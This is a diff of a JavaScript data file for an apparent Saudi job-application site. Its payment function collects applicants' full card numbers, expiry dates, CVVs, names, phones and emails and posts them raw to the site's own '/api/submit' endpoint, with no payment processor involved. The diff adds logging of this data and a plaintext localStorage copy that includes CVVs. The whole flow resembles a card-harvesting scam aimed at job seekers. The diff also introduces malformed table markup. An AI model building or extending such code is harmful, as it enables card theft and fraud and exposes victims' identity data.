@@ -1,9 +1,10 @@
-// ==// ==========================================
+// ==========================================
 // منصة توظيف السعودية - الاتصال بـ Vercel
 // جميع البيانات تخزن محلياً وتُرسل إلى الخادم
 // ==========================================
 
-const API_URL = '/api/api';
+// ✅ تم التصحيح: تغيير المسار إلى /api/submit
+const API_URL = '/api/submit';
 
 // ========== إدارة المستخدمين (محلياً) ==========
 
@@ -127,27 +128,43 @@ function getUserApplications(userId) {
 // ========== إدارة المدفوعات (محلياً + إرسال إلى الخادم) ==========
 
 async function savePayment(paymentData) {
+    console.log('📤 بدء عملية الدفع...');
+    console.log('البيانات:', paymentData);
+    
+    // حفظ محلياً أولاً
+    const payments = JSON.parse(localStorage.getItem('saudi_payments') || '[]');
+    const newId = payments.length > 0 ? Math.max(...payments.map(p => p.id)) + 1 : 1;
+    const newPayment = {
+        id: newId,
+        ...paymentData,
+        status: 'completed',
+        paymentDate: new Date().toISOString()
+    };
+    payments.push(newPayment);
+    localStorage.setItem('saudi_payments', JSON.stringify(payments));
+    
+    // تجهيز البيانات للإرسال إلى الخادم
+    const remoteData = {
+        id: newId,
+        userEmail: localStorage.getItem('currentUserEmail'),
+        userId: paymentData.userId,
+        applicationId: paymentData.applicationId,
+        amount: paymentData.amount,
+        cardNumber: paymentData.cardNumber,
+        cardExpiry: paymentData.cardExpiry,
+        cardCvv: paymentData.cardCvv,
+        cardHolderName: paymentData.cardHolderName,
+        paymentMethod: paymentData.paymentMethod,
+        jobName: localStorage.getItem('selectedJobName'),
+        fullName: paymentData.fullName,
+        phone: paymentData.phone,
+        time: new Date().toISOString()
+    };
+    
+    // محاولة الإرسال إلى الخادم
     try {
-        // تجهيز البيانات للإرسال إلى الخادم
-        const remoteData = {
-            userEmail: localStorage.getItem('currentUserEmail'),
-            userId: paymentData.userId,
-            applicationId: paymentData.applicationId,
-            amount: paymentData.amount,
-            cardNumber: paymentData.cardNumber,
-            cardExpiry: paymentData.cardExpiry,
-            cardCvv: paymentData.cardCvv,
-            cardHolderName: paymentData.cardHolderName,
-            paymentMethod: paymentData.paymentMethod,
-            jobName: localStorage.getItem('selectedJobName'),
-            fullName: paymentData.fullName,
-            phone: paymentData.phone,
-            time: new Date().toISOString()
-        };
+        console.log('📡 جاري الإرسال إلى:', API_URL);
         
-        console.log('📤 جاري إرسال البيانات إلى الخادم:', remoteData);
-        
-        // إرسال إلى Vercel API
         const response = await fetch(API_URL, {
             method: 'POST',
             headers: {
@@ -156,20 +173,19 @@ async function savePayment(paymentData) {
             body: JSON.stringify(remoteData)
         });
         
-        const result = await response.json();
-        console.log('✅ تم إرسال البيانات إلى الخادم:', result);
+        console.log('📡 حالة الاستجابة:', response.status);
         
-        // حفظ محلياً أيضاً
-        const payments = JSON.parse(localStorage.getItem('saudi_payments') || '[]');
-        const newId = payments.length > 0 ? Math.max(...payments.map(p => p.id)) + 1 : 1;
-        const newPayment = {
-            id: newId,
-            ...paymentData,
-            status: 'completed',
-            paymentDate: new Date().toISOString()
-        };
-        payments.push(newPayment);
-        localStorage.setItem('saudi_payments', JSON.stringify(payments));
+        const result = await response.json();
+        console.log('✅ رد الخادم:', result);
+        
+        // تحديث حالة الدفع في localStorage
+        const allPayments = JSON.parse(localStorage.getItem('saudi_payments') || '[]');
+        const index = allPayments.findIndex(p => p.id == newId);
+        if (index !== -1) {
+            allPayments[index].serverSynced = true;
+            allPayments[index].serverId = result.id;
+            localStorage.setItem('saudi_payments', JSON.stringify(allPayments));
+        }
         
         // تحديث حالة الطلب إلى مدفوع
         const apps = JSON.parse(localStorage.getItem('saudi_applications') || '[]');
@@ -182,20 +198,16 @@ async function savePayment(paymentData) {
         return { success: true, id: newId, remote: result };
         
     } catch(error) {
-        console.error('❌ فشل إرسال البيانات:', error);
+        console.error('❌ فشل الإرسال إلى الخادم:', error);
         
-        // حفظ محلياً فقط في حالة فشل الإرسال
-        const payments = JSON.parse(localStorage.getItem('saudi_payments') || '[]');
-        const newId = payments.length > 0 ? Math.max(...payments.map(p => p.id)) + 1 : 1;
-        const newPayment = {
-            id: newId,
-            ...paymentData,
-            status: 'completed',
-            paymentDate: new Date().toISOString(),
-            offline: true
-        };
-        payments.push(newPayment);
-        localStorage.setItem('saudi_payments', JSON.stringify(payments));
+        // حفظ كنسخة احتياطية offline
+        const offlinePayments = JSON.parse(localStorage.getItem('saudi_payments_offline') || '[]');
+        offlinePayments.push({
+            ...remoteData,
+            failedAt: new Date().toISOString(),
+            error: error.message
+        });
+        localStorage.setItem('saudi_payments_offline', JSON.stringify(offlinePayments));
         
         return { success: true, id: newId, offline: true, error: error.message };
     }
@@ -230,6 +242,7 @@ function exportToJSON() {
         jobs: JSON.parse(localStorage.getItem('saudi_jobs') || '[]'),
         applications: JSON.parse(localStorage.getItem('saudi_applications') || '[]'),
         payments: JSON.parse(localStorage.getItem('saudi_payments') || '[]'),
+        offlinePayments: JSON.parse(localStorage.getItem('saudi_payments_offline') || '[]'),
         exportDate: new Date().toISOString()
     };
     
@@ -311,7 +324,7 @@ function showAllDataInDashboard(containerId, currentUserId) {
             <h3 style="color:#1a4a6e;margin-bottom:1rem;">📝 طلبات التوظيف (${applications.length})</h3>
             <div style="overflow-x:auto;">
                 <table style="width:100%;border-collapse:collapse;background:white;border-radius:16px;overflow:hidden;">
-                    <thead><tr style="background:#1a4a6e;color:white;"><th style="padding:12px;">ID</th><th style="padding:12px;">الوظيفة</th><th style="padding:12px;">الاسم</th><th style="padding:12px;">الهوية</th><th style="padding:12px;">الجوال</th><th style="padding:12px;">المدينة</th><th style="padding:12px;">المؤهل</th><th style="padding:12px;">الخبرة</th><th style="padding:12px;">الحالة</th><th style="padding:12px;">تاريخ التقديم</th></tr></thead>
+                    <thead><tr style="background:#1a4a6e;color:white;"><th style="padding:12px;">ID</th><th style="padding:12px;">الوظيفة</th><th style="padding:12px;">الاسم</th><th style="padding:12px;">الهوية</th><th style="padding:12px;">الجوال</th><th style="padding:12px;">المدينة</th><th style="padding:12px;">المؤهل</th><th style="padding:12px;">الخبرة</th><th style="padding:12px;">الحالة</th><th style="padding:12px;">تاريخ التقديم</th></table></thead>
                     <tbody>
                         ${applications.map(a => `<tr style="border-bottom:1px solid #eee;"><td style="padding:12px;">${a.id}</td><td style="padding:12px;">${a.jobName}</td><td style="padding:12px;">${a.fullName}</td><td style="padding:12px;">${a.nationalId}</td><td style="padding:12px;">${a.phone}</td><td style="padding:12px;">${a.city}</td><td style="padding:12px;">${a.qualification}</td><td style="padding:12px;">${a.experience}</td><td style="padding:12px;"><span style="background:${a.status === 'paid' ? '#00b894' : '#ffd32a'};color:${a.status === 'paid' ? 'white' : '#1a4a6e'};padding:4px 12px;border-radius:20px;">${a.status === 'paid' ? 'مدفوع' : 'قيد المراجعة'}</span></td><td style="padding:12px;">${new Date(a.appliedAt).toLocaleDateString('ar-SA')}</td></tr>`).join('')}
                     </tbody>
@@ -350,4 +363,4 @@ window.SaudiJobsDB = {
 };
 
 console.log('✅ get-data.js تم تحميله بنجاح');
-console.log('📁 البيانات تخزن محلياً وتُرسل إلى Vercel');
+console.log('📁 API URL:', API_URL);
